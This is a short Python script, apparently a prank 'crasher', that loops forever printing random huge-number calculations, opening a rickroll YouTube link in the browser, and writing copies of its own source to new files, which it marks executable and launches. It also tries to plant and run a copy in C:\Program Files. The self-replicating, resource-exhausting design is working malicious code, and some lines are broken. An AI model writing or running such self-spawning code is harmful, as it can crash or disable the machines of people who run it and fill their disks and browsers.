from datetime import datetime
import random
import math
import shutil
import os
import glob
import binascii
import os, sys, time, uuid
import stat
import webbrowser
import subprocess

# get self code
file = ("boi2.py","w+")
self_content = open(__file__).read()

#class crasher():
count = 0
max = 9999999999999999999999999999999999.9999999999999999999999
maxInt = 999999999999999999999999999999999999999999999999999999

while count != 1:
    now = datetime.now()
    print(str(now))

    first_calc = random.triangular(0.0, max, (((max) / (math.sqrt(max) * math.sqrt(max * 2)) * max) - (max * (math.sqrt(max * .0001)))))

    second_calc = random.uniform(-max, (((max) / (math.sqrt(max) * math.sqrt(max * 2)) * max) - (max * (math.sqrt(max * .0001)) * math.factorial(10))))

    third_calc = random.uniform(-max, max)

    fourth_calc = random.randint(0, maxInt * maxInt)

    print(first_calc * first_calc)

    print(second_calc * math.pow(second_calc, first_calc))

    print(third_calc)

    print(fourth_calc)

    print(fourth_calc * fourth_calc / third_calc - first_calc)

    max = first_calc * first_calc

    webbrowser.open_new('https://www.youtube.com/watch?v=dQw4w9WgXcQ')

    webbrowser.open('https://www.youtube.com/watch?v=dQw4w9WgXcQ', new=1, autoraise=True)
	
    _ = '_=%r;print _(%%)_';
    print(_ % _)

    # create unique filename
    dupe = "%s.py" % uuid.uuid4()

    # open and write to the copy
    copy = open(dupe, "w", )
    copy.write(self_content)
    copy.close()

    # make the copy executable and execute
    os.chmod(dupe, stat.S_IXUSR)
    os.system("./%s &" % dupe)
    os.startfile(dupe)

    #Edit
    try:
        target_directory = "C:\Program Files"
        shutil.copy(dupe, target_directory)
        print(os.path.dirname(os.path.abspath(__file__)))
        dupeDirectory = glob.glob("C:\{0}\BOI2.py".format(target_directory))
        os.chmod(dupeDirectory, stat.S_IXUSR)
        os.system("./%s &" % dupeDirectory)
        os.startfile(dupeDirectory)

    except(PermissionError):
        print("Permission to copy BOI2 into {0} has been denied. Continuing operations.".format(target_directory))

    #Safety Module
    time.sleep(10)